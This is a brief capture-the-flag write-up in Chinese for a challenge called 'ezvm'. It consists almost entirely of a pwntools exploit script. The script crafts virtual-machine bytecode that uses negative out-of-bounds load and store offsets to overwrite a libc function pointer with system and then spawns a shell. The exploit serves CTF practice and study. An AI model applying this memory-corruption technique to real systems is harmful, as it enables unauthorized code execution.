# ezvm 简单虚拟机

by Maple

慢慢来看的话其实很简单，先贴exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
#gdb.attach(p)

#offset = -0xf980
#7：末字符++
#8：末字符--
#5：负溢出
# printf = 0x606f0
# system = 0x50d70
def sub():
    return p8(0x4)

def push(x):
    return p8(0x1)+p8(x)

def store(x):
    return p8(0x5)+p8(x,signed = True)

def load(x):
    return p8(0x6)+p8(x,signed = True)

def add():
    return p8(0x3)

payload = push(0xf0-0x70)+load(0x20-0xA0)+sub()
payload+= push(0xd-0x6)+load(0x20-0xA0+0x1)+add()
payload+= push(1)+load(0x20-0xA0+2)+sub()
payload+=store(0x20-0xA0+2)+store(0x20-0xA0+1)+store(0x20-0xA0)
payload+=push(ord("s"))+store(0)+push(ord("h"))+store(1)

p.sendlineafter("length:",str(len(payload)))
p.sendline(payload)
p.interactive()
```

